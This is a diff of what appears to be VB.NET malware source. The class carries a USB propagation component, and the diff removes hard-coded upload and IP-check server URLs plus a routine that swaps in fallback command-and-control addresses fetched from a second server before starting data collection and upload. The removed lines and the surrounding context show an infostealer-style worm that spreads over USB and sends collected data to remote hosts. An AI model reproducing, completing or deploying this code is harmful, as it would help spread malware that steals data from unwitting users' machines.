@@ -14,9 +14,6 @@ Public Class Form1
     Public Shared ReadOnly AppData As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
     Public Shared ReadOnly LocalAppData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
     Public USBPro As New S4Lsalsoft.USBPropagator
-    Private IpURL As String = "https://[Server]/ip.php"
-    Private UploadUrl As String = "https://[Server]/upload.php"
-    Private GitMem As String = "https://[Other Server]/Wget.txt" ' Ulrs Helper https://[Server]/ip.php$https://[Server]/upload.php ' Splitter is $
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         On Error Resume Next
@@ -57,30 +54,6 @@ Public Class Form1
             End If
         End If
 
-    End Sub
-
-    Public Sub Start()
-        Try
-            If Wxaml.Classes.classTools.IsOnline(UploadUrl) Then
-                GetDataStart()
-            Else
-
-                Dim GetNewUrls As String = GetHTMLPage(GitMem)
-
-                If Not GetNewUrls = "" Then
-
-                    Dim Splitter As String() = GetNewUrls.Split("$")
-
-                    IpURL = Splitter(0)
-                    UploadUrl = Splitter(1)
-                    GetDataStart()
-
-                End If
-
-            End If
-        Catch ex As Exception
-            ScriptInstaller()
-        End Try
     End Sub
 
     Public Sub GetDataStart()
